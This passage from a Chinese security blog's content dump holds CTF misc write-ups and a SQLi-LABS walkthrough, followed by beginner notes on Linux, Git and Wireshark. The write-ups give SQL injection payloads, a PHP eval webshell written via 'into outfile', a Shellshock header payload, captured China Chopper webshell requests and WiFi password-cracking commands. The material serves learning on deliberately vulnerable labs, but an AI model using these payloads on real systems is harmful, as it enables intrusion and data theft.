$M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();￿=/var/www/html/secret/ 拿着百度一下，发现应该是菜刀的连接之类的，而且看到了/secret/。再对上题目估计就是找这个目录下的东西了，一上来距离感觉就很接近了，然后继续慢慢找，又找到了一个base64加密的 解码后得到 1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;echo @fwrite(fopen(base64_decode($_POST[&quot;z1&quot;]),&quot;w&quot;),base64_decode($_POST[&quot;z2&quot;]))?&quot;1&quot;:&quot;0&quot;;;echo(&quot;|&lt;-&quot;);die();￿=/var/www/html/secret/s3cr3t.txt￿=flag&#123;Inf0rm4ti0n53curity&#125; emmm这就拿到flag有点算是非正常解了，hhhh，但是看到s3cr3.txt和前面估计也是正确的。 本来就是为了训练，又翻了这个数据包， 发现前面有Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c MD5解为acunetix， （记得选择分组字节后可以更改下面的解码方式） 发现了 1Referer: () &#123; Referer; &#125;; echo -e &quot;Content-Type: text/plain\\n&quot;; echo -e &quot;\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153&quot; 百度了，发现是awvs在测试shellshock（破壳漏洞）。 你先还是我先解压，文件名称就提示base，一看内容，emmmm太多了，网上base解码够呛，使用python自带的base64模块解码。 12345678910111213141516import base64ab = open(&quot;base.txt&quot;,&quot;r+&quot;)content = ab.read();print (len(content))while True: try: content = base64.b64decode(content).decode() except: try: content = base64.b32decode(content).decode() except: try: content = base64.base16decode(content).decode() except: print(&#x27;&#x27;,content) break 一下子结果就出来了。 过滤语法二维码藏到哪里了WireLess解压，看见WiFi.pcap和README.txt，README.txt提供了密码格式为6666xxxx，WireShark看WiFi.pcap，看了半天，没什么有用的东西，只找到了flag{05password-f059-448f}，好的吧，想了想，WiFi估计是破解密码了，如果不接触可能这题没法做。 打开kali（记得安装vmwaretools方便拖拽文件），先输入crunch确定 有没有，然后 1crunch 8 8 -t 6666%%%% &gt;&gt; 123.txt 生成密码（前面是最小位数和最大位数，后面是输出文件），这样密码字典生成完毕 启动Aircrack-ng， 1aircrack-ng -a2 WiFi.pcap -w 123.txt 回车，发现有个flag{05password-f059-448f}的位置，输入前面序号即可开始破解。 将66668912与前面的flag里面的password替换提交即可，记得格式为Flag{} tips: crunch格式：crunch min_length max_length str options， -c 数字 指定输出文件行数， -d 数字符号 限制相同元素出现个数，-e 字符串 定义停止生成密码 -o或者&gt;&gt; 文件名 指定输出文件名称，-p 字符串 排列组合生成字典 -q 文件名 读取文件 crunch 1 8 生成最小1位最大8位，由26小写字母的组合， crunch 1 6 str由字符串str组成最小1位，最大6位的组合， -t：@小写字母，,大写字母，%数字，^常见符号。 Aircrack格式：仅介绍用于密码本破解，因为内容有点多 -a2握手包，-w指定字典文件（rockyou.txt为自带，使用记得解压） soeasy在这个文件中找到key就可以通关 放到HxD里面翻了一下就找到了。。。key: HackingLabHdd1b7c2fb3ff3288bffe，然后加上flag没成功，然后去掉就成功了，emmmm丝毫没有成就感。 一般CTF里面碰到easy之类的都是有点绕要不是半个硬骨头，意外。。。 (╯°□°）╯︵ ┻━┻DDCTF2018的经典吐槽对象，掀桌子。 d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd 16进制，len()看到长度为134，偶数，两个一对看ASCII码，基本上都是大于128，掀桌子提示就在这，减去128，然后转为ascii码即可得到结果。python脚本如下： 12345678a = &quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&quot;i = 0flag = &quot;&quot;while i &lt; 133: num = int(a[i:i+2],16)-128 flag += chr(num) i += 2print (flag) 1That was fast! The flag is: DDCTF&#123;9af3c9d377b61d269b11337f330c935f&#125; 换上格式即可。 can_has_stdio?解压，看到misc50，放到HxD，发现是brainfuck加密，推荐这个网站解密http://esoteric.sange.fi/brainfuck/impl/interp/i.html，但是存在一个问题，中间空格太多，目的应该就是通过python或者手动方式去掉空格，然后解密。python3脚本如下 12345678910ab = open(&quot;misc50&quot;,&quot;r+&quot;)text = ab.read()print (len(text))text = &quot;&quot;.join(text.split())print (len(text))ab.close()ac = open(&quot;1.txt&quot;,&quot;r+&quot;)ac.write(text)ac.close() 得到flag{esolangs_for_fun_and_profit} simple_transfer文件里有flag，找到它 先放到了HxD全是TCP还有其他的，看了一会没啥有用的，开linux，binwalk分析文件头 1binwalk 文件名 有PDF，foremost分离（没有的下载即可apt-get install foremost） 1foremost 文件名 文件输出到output文件夹内，找到打开pdf即可。 fftp小黑用ftp下载了一个flag.jpg，却没有flag，你帮他找到 解压后fftp.pcapng，用binwalk能看到JPEG，但是binwalk和foremost分离不出来 放到WireShark打开，题目提示ftp，既然没有HTTP就先从FTP找，追踪TCP流，发现FTP基本上都是这种，应该是FTP下载的各种用户信息。 看到有FTP-DATA的协议，追踪TCP流，第一个就是下载信息， 第二个开始Length明显增大，追踪TCP流，对比文件头好像没啥用，搜索flag，得到flag{9XyMzJU8nEo9UgvhLO96ruIf1gmNIQ9t} 获取密码八位密码，在文档中的图片中找… 解压，pngdecode.docx文件，然后打开保存360的图片stegsolve翻了翻常规的都没有，又放到了linux用binwalk分析，一堆zip，foremost分离，emmm然后没密码？？？有一个jpg的文件夹被分离了，然后没啥有用的了，另一个zip的文件夹压缩包解压还是这么多，本着试下的态度交了360HA360结果成功了，怀疑自己非正常解。。。 doll解压，发现套娃的含义。。。png图片，HxD和binwalk分析都没有有用的东西，后来看WP才知道是LSB隐写的BGR位，可以参考这个stegsolve使用，虽然是使用，但是介绍了LSB。 flag{03a253f5-8e93-4533-bcfc-af908830095d} Mirror反转 打开压缩包，一个flag.jpg，用HxD打开好像没啥东西，用binwalk测试发现无隐藏文件，返回，看HxD的文件内容，发现%PNG的标识在文件最后而且倒着的。python读取然后重新写入 12345with open(&#x27;flag.jpg&#x27;,&#x27;rb&#x27;) as f: with open(&#x27;flag1.jpg&#x27;,&#x27;wb&#x27;) as g: g.write(f.read()[::-1]) 拿到flag 你能看见么说实话，这个我没做出来，然后看的WP，发现是盲文，倒是和题目名称对应了。。。 boooooomhappy 解压，需要密码，直接用AZPR破解，结果是3862，看password.py，需要password.zip的内容，破解试了1-5位不太行，试CRC32破解，得到08646247，加到password.py里面然后注释掉前面的语句，得到一串字符95c800c52134a571dfe69114c378e4be，拿到flag.png，放到HxD没问题，改宽高发现一串字符，95c800c52134a571dfe69114c378e4be，但是我并没有提交成功，加了格式也不对，不过会了就行了。 webcrypto","path":"2020/01/29/掘安平台Writeup/","date":"01-29","excerpt":"新学习sql注入，找个东西训练下。","tags":[{"name":"掘安CTF","slug":"掘安CTF","permalink":"https://www.ea6th.top/tags/%E6%8E%98%E5%AE%89CTF/"}]},{"title":"sqli-labs训练-day1-2","text":"新学习sql注入，找个东西训练下。 SQLi-LABS训练前言看《SQL注入攻击与防御》简单学习了WEB的SQL注入，找了SQLi-LABS进行训练， 搭建不再赘述，用的是phpstudy和sqli-libs，下载完sqli-labs安装包放到WWW文件夹解压然后点击Setup/reset Database for labs即可， 出现这个类型的样式即为成功。 lesson-1GET-Error based-Single quote-String 根据页面提示?id=1，发现返回登录名称和密码，重复测试，id=2直到id=15，发现id=15没有返回，确定通过这种方式可以遍历数据库，不过和题意关系不大。 加’测试 报错为”1”说明存在字符注入，使用—+注释掉后面语句，并用order by语句判断字段当为4时候报错Unknown columb ‘4’ in ‘order clause’说明存在三列 然后union语句根据order by得到的显示位回显，注意这里前面要出错，因为源码调用了mysql_fetch_array一次，导致这里只会出现第一行查询结果，出错前面为空，这样才能显示所查询的内容。 union构造成功，然后可以开始爆库一条龙。注意database()为查询数据库名，version()为查询版本号，@@version_compile_os为操作系统信息，@@datadir为数据库路径 table_name即为表名，schemation即为数据库名。找到user爆列名 找到password可以返回所有用户+密码 这一关结束。 lesson-2GET-Error based-Intiger based 输入id，加’发现返回这样的错误，只需要注释 ，直接order by猜列数，然后union构造即可。 结果如下 lesson-3GET-Error based-Single quotes with twist-string 还是一样，构造id=1’报错，发现与前面不太一样，为”1”)，对比与lesson-1的图，构造?id=1’’)，成功。后面依旧一个套路。 结果如下 lesson-4GET-Error based-Double Quotes-String id=1’没报错，测试双引号”报错， 根据报错信息推测是(“$id”)，PHP中双引号内单引号会被作为转义，由于后有)构造为?id”)，后面一个套路即可，结果如下。 lesson-5GET-Double Injection-Single Quotes-String 根据题目提示为双查询注入，其实就是嵌套语句，第五关开始变的有难度，推荐先补下SQL数据库，SQL部分基础语法，SQL, 需要掌握的基本语句：嵌套，count()，substring()，limit()，floor()，rand()等等。 如上面一样，先测试id=1’返回”1”说明没啥id构造没问题，—+进行注释掉后面语句。 order by查列数，还是3， union select 1,2,3还是可以，在后爆数据库名称已经发现得不到回显了，只会有个You are in…..的显示，开始主题，双查询注入。 select database()结果是返回数据库名称，as xxx为取别名，group by为排序。 floor (rand()*2)里面是rand()先返回一个0-1的小数，floor()为取不大于某数的最大整数值，所以结果不是0就是1。 使用concat()连接后只有两种结果，而加上from table_name后会返回一个两种随机结果的集合，而其数目由表本身和concat连接语句决定，具体的牵扯到数据库键值与计数的问题，不过多阐述。又由于键值与计数的随机存储问题，导致多次才会使结果报错，因此几次尝试后可以得到数据库名称，当然到现在为止语句以及构建完成，后面的就是爆表名、列名一条龙。 通过数据库名爆表名，由于返回只有一条而且无可以连接的显示框架，所以使用limit()截断依次得到表名，（limit从0开始） 试到3时成功找到存储用户的表名。 继续通过表名爆列名。 爆到密码的列名。 爆字段。这里通过修改limit()即可切换不同用户名和密码的字段。 密码字段。 lesson-62020-01-20 GET-double injection-double quotes-string 看提示就知道和5类似， ?id=1后加’没有报错，加”为?id=1&quot;报错，后面和5类似。 最后结果如图 lesson-7GET-Double Injection-Single Quotes-String 需要掌握的：mysql的文件操作，load_file()、into outfile，可参考https://blog.csdn.net/like98k/article/details/79452002， 先构造id，?id&#39;))--+，由于是文件导入的方式注入，需要知道文件路径，先从其他的关卡得到绝对路径。 根据路径写入 12union select 1,2,3 into outfile &quot;路径\\自定义的文件名&quot;union select 1,2,&#x27;&lt;?php @eval($_post[“自定义”])?&gt;&#x27; into outfile &quot;路径\\xx.php&quot; 之后可以菜刀连接。 lesson-8GET-Blind-Boolian Based-Single Quotes 需要掌握：length()、ascii()、substr()、regxp()等盲注相关。 由于无回显只能盲注，简单来说就是利用ascii根据if的判断是否有回显验证是否注入正确的方式，包括布尔盲注、时间盲注和报错盲注。这次采用布尔盲注。 数据库名第一个ASCII字符是否大于64，是则为1，回显正常。 测试数据是否大于115(ascii为s)无回显，重复测试即可确定数据库名称。 判断数据库名长度，if(length(database())=8,1,0) 爆数据库名，if(ascii(substr((select database()),1,1))&gt;xx,1,0) 爆表名，if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;xx,1,0) 爆列名，if(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))&gt;xx,1,0) 爆字段，if(ascii(substr((select username from users limit 0,1),1,1))&gt;xx,1,0) lesson-9GET-Blind-Time based-Single Quotes 需要掌握：sleep()。 提示时间注入，其实上一题也可以时间注入，简单来说就是通过响应的时间判断是否注入成功以及是否判断正确。也是盲注。 先构造，?id=1 --+ 爆数据库名，and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) 判断数据库长度，and if(length(datbase())=8,sleep(5),1) 爆表名、列名、字段类似。 lesson-10GET-Blind-Time based-double quotes 注意提示，和lesson-9除了单双引号没有区别。 下一部分就是POST相关的注入了。 lesson-112020-01-22 POST-Error Based-Single quotes-String 考查POST登录方面的注入，先看源码中post传输所用名称，hackbar等插件时有用 测试用户名&#39;or 1=1#，密码为空或不填均可。 回显成功，解释是：如GET的MYSQL语句类似， 1select * from table_name where uname=&#x27;&#x27; and passwd=&#x27;&#x27; 在输入&#39;or 1=1#后，原语句变为： 1select * from table_name where uname=&#x27; &#x27;or 1=1# &#x27; and passwd=&#x27;&#x27; where判断中uname与passwd均为0，1=1成1，or连接，且#将后面语句注释，成功注入。 其他已可行的注入语句。 admin&#39;or&#39;1&#39;=&#39;1# 然后可以开始查询数据库列数。 回显与&#39;or 1=1#类似，回显用户名与密码不一样在在于&#39;or 1=1#返回的为默认第一个用户，而后面的指定了用户名为admin。值得注意的是POST与GET终于不太一样，列数不为3。。。 爆数据库类似的爆版本号不再赘述 爆表名 爆列名 爆字段 收工 PS：这关没啥难点，但是注意注释符号#有用，—+没用，原因是PHP版本的问题，找不到大佬的链接了，以后补上。 lesson-12POST-Error Based-Double quotes-String-with twist 看提示就知道类型一样，字符串方式不一样。 先试admin&#39;没有回显，再测试admin&quot;（前面是%27，后面是%22），有回显 根据保错估计是id=(“”)这种类型。测试加上#回显没问题。 然后爆数据库名称等等 收工。 lesson-13POST-Double Injection-Single quotes-String-with twist 还是单引号双引号还有括号都测试，然后发现&#39;)有效，连接发现无回显。 emmm很明显可以盲注。。但是看了提示发现和lesson-5差不多，可以使用双查询语句。 爆数据表 爆列名 爆字段，用户名与密码对应。 即第2个（limit从0开始的）帐号和密码为Angelina和I-kill-you，依次可遍历数据库所有信息。 lesson-14POST-Double Injection-Single quotes-String-with twist 蛋疼，两个关卡一样，明天看看官方的是不是下错了。 lesson-152020-02-23 POST-Blind Boolian/time Based-Single quotes 根据提示，布尔注入或者时间注入，16也是，不过16双引号，所以这个先测试布尔注入，lesson-16测试时间注入。 先构造注入点，为uname=admin&#39; #&amp;passwd=1， 因为是布尔盲注，先猜数据库名称长度。 然后判断数据库名称、表名称、列名称、字段。参考lesson-8 判断数据库名长度，if(length(database())=8,1,0) 爆数据库名，if(ascii(substr((select database()),1,1))&gt;xx,1,0) 爆表名，if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;xx,1,0) 爆列名，if(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))&gt;xx,1,0) 爆字段，if(ascii(substr((select username from users limit 0,1),1,1))&gt;xx,1,0) lesson-16POST-Blind-Boolian/Time Based-Double quotes 测试时间注入， 先构造基本的注入点 判断数据库长度、数据库名称、表名、列名、字段。 和布尔注入类似。 开始有waf，对字符进行处理。 lesson-17POST-Update Query-Error Based-String 查看源码（摘取部分） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 需要掌握知识：update 由于用户名uname已经有很多限制，所以选择passwd来去起作用。 passwd=1%27 and updatexml(1,concat(&quot;:&quot;,(select database()),&quot;:&quot;),1) # 接下来爆表名 爆列名 爆字段并未成功，先留着 lesson-18POST-Header Injection-Uagent field-Error based lesson-19POST-Header Injection-Referer field-Error based lesson-20POST-Cookie injections-Uagent field-error based 参考 Sqli-labs通关文档 SQLI-LABS修炼笔记","path":"2020/01/15/sqli-labs学习/","date":"01-15","excerpt":"新学习sql注入，找个东西训练下。","tags":[{"name":"sql","slug":"sql","permalink":"https://www.ea6th.top/tags/sql/"}]},{"title":"linux学习","text":"初学的Git手册，以后会修改，要是想找点新手资料，可参考 linux命令预备知识一切事物皆为文件 关于权限r为read读取权限，w为write写入权限，x为excute执行权限。 文件权限按顺序为所有者权限、用户组权限、其他用户权限。 快捷使用12man 命令 快速找到linux的命令手册说明，英文功能键说明：空格下一屏，``Ender``滚动手册的一行，``b``后退上一屏，``f``前进后一屏，``q``退出man命令，h列出所有功能键。 tab键，自动补全 history列举历史命令 命令 —help 命令基本文件/目录操作日常操作 ls 列出显示当前目录 123ls / 列出根目录 ls -a 列出当前目录所有文件(包括隐藏文件)-l 长模式列出目录文件详细信息 ls -l -h 人性化方式方式显示文件信息ls -ld 显示当前目录本身属性。 关于ls显示的文件信息解释：-rwxrw-rw- 1 root root 320042 Jul 29 2018 music.wav，权限、硬链接个数、所属用户、所属组、文件大小(单位：b)，最后修改时间，文件名。 ls的查找规则 123ls aa* 以aa开头的文件 ls *bb 查找以bb结尾的文件ls ? ?代表文件中任意一个字符(仅一个) ls [sbc] 匹配sbc的任意一个字符ls [a-f] 匹配a到f范围内的任意字符 cd 切换工作目录 12cd .. 返回上级目录 cd ~ 返回当前用户的目录cd - 返回上一个操作的目录 cd 相对路径/绝对路径 切换目录 (绝对路径一般/开头) pwd 显示当前目录 cp 复制文件/目录 123cp a1 a2/2 将a1文件复制到a2文件夹的2文件夹内 cp -p 保留文件属性cp -r 复制目录 cp -a 复制目录常用，保留链接、文件属性，cp -v 显示进度 mv 移动和重命名文件/目录 12mv 1 a1 将文件/目录1重命名为a1 mv 1 a1/ 将文件1移动到a1文件夹内mv -v 显示进度 rm 删除文件/目录 12rm xxx.xx 删除xxx.xx文件 rm -f 删除且不提示，rm -r xx/ 递归方式删除目录及其内文件 rm -rf 删除全部文件，不提示 touch新建文件、mkdir新建文件夹 1touch xx.xx 新建名为xx.xx的文件 mkdir s1 s2 新建名为s1和s2两个目录 cat 显示文件内容 123cat xxx.xx 显示xxx.xx文件的内容 cat -b 段落编号输出(空白符不编号)cat -n 以行为单位加编号输出(空白符编号，与-b类似)cat -n a1 &gt; a2 将a1并入a2 head与tail 查看文件前/后n行（默认10行） 1head/tail -n 123.txt 查看文件前/后n行 less、more 12less 查看文件，enter下一行，空格键下一页，more 分屏显示，空格键下一页，q退出显示，h键帮助 查找类 grep 查找文件内的字符串，应用正则后很强大 12grep &#x27;搜索内容&#x27;-n 显示匹配行及行号， -i 忽略大小写 find 查找文件 123456find ./ -name 123.txt 查找当前目录下名为123.txt的文件find ./ -name &#x27;*.txt&#x27; 查找当前目录下所有后缀为.txt的文件find ./ -name &quot;[a-z]*&quot; 查找当前目录下所有以小写字母开头的文件find ./ -size +2M 查找当前目录下大于2M的文件，-2M为小于，不标为等于find ./ -size +4M -size -5M 查找当前目录下大于4M小于5M的文件find ./ -perm 0777 查找当前目录下权限为777的文件/目录 which 寻找命令 1which grep 查看命令的位置 其他类型 ln 创建文件链接 分为软链接和硬链接，软链接类似于快捷方式，硬链接在源文件删除后还会存在，不删除更改会跟随源文件。-v详细过程，-f强制执行，-d超级用户制作目录的硬链接。 12ln -s 源文件 软链接文件ln 源文件 硬链接文件 echo 输出内容 123echo &quot;需要显示的内容&quot; &quot;&quot;亦可省略echo &quot;需要写入文件的内容&quot; &gt; 123 把结果写入到文件echo `date` 命令执行结果，反引号`` clear 清除终端的显示 用户管理 who 查看当前登录系统的用户信息，whoami：查看当前系统当前账号用户名，在/etc/passwd有系统用户信息。 12who -m或am I 只显示用户名、登录终端和登录时间who -q或--count 只显示等登录账号和用户数量 passwd 修改密码 su 切换用户 useradd 添加用户 123-d 指定用户登录系统的主目录，不使用时自动在/home建立-m 自动建立目录-g 指定组名称 userdel 删除用户 1userdel 123 删除名为123的用户， -r同时删除目录和记录 用户组 12345groupmod +三次tab键 查看用户组或者/etc/groupgroupadd 新建组账号groupdel 删除组账号usermod 修改用户所在组，-g 用户组 用户名groups 用户名 查看用户在哪个组 修改文件权限 chmod 1234chmod u/g/o/a +/-/= 文件u为所有者，g为所有者所在组，o为其他用户，a为所有用户+、-、=依次为增加、撤销、设定权限chmod 新用户名 文件名 修改所有者 12chown 新用户名 文件名 修改文件所有者chgrp 新组名 文件名 修改文件所属组 添加sudo权限 12sudo usermod -a -G adm 用户名sudo usermod -a -G sudo 用户名 系统进程等 ps 进程 -a 所有进程，包括其他用户的进程 -u 进程的详细状态 -x 显示没有控制终端的进程 -w 显示加宽， -r 显示运行的进程 top 动态显示进程 M 内存使用量排序，P CPU占有率排序，T 运行时长排序，U 根据用户名排序， K 根据PID杀死进程，q退出，h帮助 kill 终止进程 1kill pid 根据pid号终止，0-15，9为绝对终止 df与du，磁盘占用 df，文件系统磁盘空间占用和空余，还有对节点和磁盘块的使用 -a 所有文件系统，-m 以1024字节为单位，-t 显示各指定文件系统使用，-T 显示文件系统 du，侧重于磁盘使用情况 -a 递归显示指定目录文件和子目录文件占用数据块， -s 显示指定文件或目录占用数据块 -l 计算所有文件大小 -h 转换单位 网络信息 123ifconfig 网卡信息ping测试远程主机的连通性netstat exit与shutdown命令 exit：图形界面会退出终端，ssh远程退出帐户， shutdown 123shutdown -t seconds 多少秒后关机， shutdown -k 并不会关机，仅警告shutdown -r 重启 shutdown -h 关机shutdown -n 杀死所有程序后关机 shutdown -F 关机并检查系统 其他日常压缩解压tar、gzip、bzip、zip、unzip 解压 .tar -c档案文件，创建打包文件，-v显示进度，-f指定名称，-t列出包含的文件，-x解开。 12tar xvf xxx.tar 解压tar cvf xxx.tar 文件 压缩 .zip 12unzip xxx.zip 解压zip xxx.zip 文件 压缩 .rar 12rar x xxx.rar 解压rar a xxx.rar 文件 压缩 .gz 123gunzip xxx.gz 解压gzip -d xxx.gz 解压gzip -r 文件 压缩 .tar.gz和.tgz 12tar zxvf xxx.tar.gz 解压tar zcvf xxx.tar,gz 文件 压缩 sort 文本内容排序 以行为单位排序，原则是ASCII码值升序， 12sort -o 输出文件sort -t 分隔字符 -u 去除重复行，-n 数值大小 规避位数多的反而排序前的情况，-b 忽略空格， -d 仅处理英文字母、数字及空格，-f 小写视为大写排序，-r 相反顺序 mount 挂载文件 cal查看当前日历，-y查看整年日历 date显示或设置时间 符号类12345&gt; 输出重定向，将命令结果重定向到一个文件内，创建或覆盖。&gt;&gt; 也是输出重定向，不同之处是&gt;&gt;会增添，而不是覆盖。| 管道，一个命令的输出可以做另一个命令的输入。&amp;&amp; 左边执行成功后执行右边，|| 左边执行失败，执行右边","path":"2019/09/17/linux学习/","date":"09-17","excerpt":"初学的Git手册，以后会修改，要是想找点新手资料，可参考","tags":[{"name":"linux","slug":"linux","permalink":"https://www.ea6th.top/tags/linux/"}]},{"title":"Git手册","text":"初学的Git手册，以后会修改，要是想找点新手资料，可参考 Git手册​Git Git使用这个笔记是在看了廖雪峰的git教程理解后写的，当做新手资料并不是很好，目前作为新手的我的查命令的小手册，以后会修改，要是想找点新手资料，可参考菜鸟教程、廖雪峰的Git教程、Pro Git均可，不过前面两个有部分笔误之处，但是作为新手资料足够了。 Git介绍懒得介绍了，关于Git与GitHub的渊源,可自行寻找,其他的特性菜鸟教程 就有. Git介绍基本知识 工作区(Working Directory)：你进行git操作的文件夹 版本库(Repository)： 暂存区(stage) 网上大多介绍云里雾里，这里谈下个人理解。 git前面知道是分布式版本控制系统，何谓分布式，在git每次你所进行提交的内容都会有个唯一的id，称之为版本号(commit id)，而这个id就是每个版本的内容修改记录，类似于时间与空间的对应性，每个时间都有一个空间，而git每次进行回退都是在使用这个id进行选择你的文件内容，在这个操作中类似于时空穿梭。而git add和git commit的操作就是根据修改形成一个版本号，也就是git的一个分支， Git操作连接 git 1git config user.name &quot;你自定义的名字&quot;git config user.email &quot;email@xx.com&quot; –global表示本机器均使用这个配置 创建一个git仓库 手动创建个文件夹或者命令创建 1mkdir examplecd examplepwd 创建git仓库 1git init 随便写个东西，比如REMADE.md 添加到仓库懒得写，可打出部分文件名,Tab键自动补全 1git add REMADE.md 添加到仓库， 1git commit -m &quot;标记&quot; -m后可输入提交的说明， file changed文件被改动，insertions加入x行内容， 进行更改文件内容， 1git status 可看到仓库状态git diff xxx.xx 可看到xxx.xx进行了什么修改 版本回退 1git log 看到提交的日志 加上--pretty=oenline看到简化的 HAED代表当前版本，HEAD^上个版本，HEAD^^上上个版本，HAED~x：上x个版本，如此类推。 commit id版本号，用来选择回退版本的序列号。 开始回退版本 1git reset --hard HEAD^git reset --hard xxxx(版本号) 均可回退版本，第二个在记住版本号后也可以在回退后再返回回去(不需要记全，几位就行.) 1git reflog 每次命令的记录 在git上，你总是可以吃”后悔药”。 总结 回到git add或git commit的状态，工作区修改未提交的全部丢弃。 1git checkout -- 文件 修改了工作区内容，添加到了暂存区，丢弃修改 1git reset HEAD 文件 修改了工作区内容，添加到了暂存区，并且提交了分支，丢弃修改。 如上，只能版本回退。 规范的删除不需要的文件 1git rm 文件git commit 连接远程仓库连接远程仓库， 添加SSH 1ssh-keygen -t rsa -C &quot;xxxx@xxx.com&quot; 遇见yes/no输入yes即可，其他情况一路回车，然后有个会显示生成的SSH密钥的位置，类似于C:/xxxxx，复制粘贴到SSH Keys即可。 github上先创建一个仓库，然后在需要上传的文件位置启动git， 1git remote add origin git@github.com:xxx/xxx.git git push -u origin master origin即为远程仓库的名称 以后只需要使用命令 1git push origin master 推送最新修改即可。 分支管理分支的一般性操作(本地)创建分支 1git checkout -b first -b创建并切换 等同于 1git branch firstgit checkout first 查看当前分支 1git branch 由于之前操作，一般会有master、first 提交 1git add 文件git commit -m &quot;xxxx&quot; 这时已经提交到了first分支里， 将first分支的合并到master里 1git merge first 结束后删除分支 1git branch -d first 切换分支 1git checkout xxx 如果在分支和master均有提交，会出现冲突 1git status 寻找到冲突的文件 修改后再次提交，git log查看没有问题删除分支即可。 1git log --graph 可以看到分支合并图 不想丢失分支的话，禁用Fast forward模式， 1git merge --no-ff -m &quot;xxxx&quot; 分支名称 可看到曾经的分支 分支策略 一般在多人协作时，master不要轻易提交，每个人使用自己的分支，有正式的版本时才开始进行合并到mater bug分支修复策略git提供了储藏的修复bug方式 1git stash 在需要修复的分支创建临时分支如bug-001 1git checkout mastergit checkout -b bug-101 立即修复后提交 1git add 文件git commit -m &quot;xxx&quot;git checkout 修复分支名称git merge -no-ff -m &quot;xxxx&quot; bug-101 修复提交结束后checkout 文件返回需要的分支即可。 需要修复时恢复 恢复bug的工作区 ```git stash apply恢复， 恢复后stash内容不删除git stash drop 删除stash的内容1232. ``` git stash pop 恢复过程中删除stash 可多次stash，需要时候查看选择即可 1git stash list 查看所有stashgit stash apply stash@&#123;xxxx&#125; 恢复某个 强制删除未被合并的分支， 1git branch -D 分支名称 多人协作(远程)先尝试推送自己的修改 1git push origin 分支名称 失败可能是远程仓库已经做了修改， 1git pull 进行合并，如果存在冲突，本地解决后再提交。 1git pull 提示no tracking informationgit branch --set-upstream-to=origin/分支名称 分支名称 建立本地与远程关联 在多次操作后会发现git log关于提交的时间线显得特别乱。。。 1git rebase 可以整理成一条直线， 其他其他普通操作 1git clone 链接 克隆项目地址cd xxxxls 目录git add -f 文件 强制提交git check-ignore -v 文件 查看哪个规则导致文件被忽略了提交git config --global alias xx xxx 用xx命令代替xxx，git last 最近的提交 修改配置文件 配置文件在.git/config中 可用来修改别名， 打标签 1git tag xxxgit tag xxx 版本号/commit idgit show xxx 查看某个标签的信息git tag -a xxx -m &quot;&quot; 版本号/commit id 带备注的标签 -a指定标签名 -m备注git tag -d xxx 删除标签 一般存在本地，需要标签页推送的话， 1git push origin xxxgit push origin --tags 推送全部标签 删除远程的标签 1git tag -d xxx 删除本地的标签git push origin :refs/tags/xxx 远程删除 参考: 廖雪峰的Git教程 Pro Git","path":"2019/07/28/Git手册/","date":"07-28","excerpt":"初学的Git手册，以后会修改，要是想找点新手资料，可参考","tags":[{"name":"Git","slug":"Git","permalink":"https://www.ea6th.top/tags/Git/"}]},{"title":"初始Wireshark","text":"wireshark学习的笔记 初识Wireshark主要介绍wireshark的对于流量分析的简单用法wireshark下载 介绍WireShark（前称 Ethereal）用网络包分析，在CTF多用于MISC的流量分析，后缀名为.pcapng的文件。 如上图， 标题与菜单栏——文件名称、wireshark的菜单栏 过滤区——自定义规则筛选数据包 Packet List面板——数据包摘要信息 Packet Details——数据包的详细信息 Packet Bytes面板——以十六进制和ASCII格式显示数据包信息 数据包术语：帧&gt;包&gt;段 安装简述==windows安装== Wireshark选择版本下载即可，在安装过程中可选择Wireshark的组件，后面还有WinPacp用于捕获数据必须的组件，如果不需要捕获，可不用安装，然后更改文件位置无脑式安装即可。 ==Linux安装== 以后补充。。 wireshark的初步使用捕获数据包&lt;img src=”https://img-blog.csdnimg.cn/20190724122708339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjY4OTM2,size_16,color_FFFFFF,t_70/&gt; 点击捕获——选项（设置选择需要捕获的设备）——开始，即为正在捕获。 或 选择下方的某个设备即可开始捕获。 以捕获WLAN，在捕获开始后设备痛过WIFI进入百度为例。 分析访问时的数据包 DNS请求、响应和TCP的三次握手。百度百科-三次握手 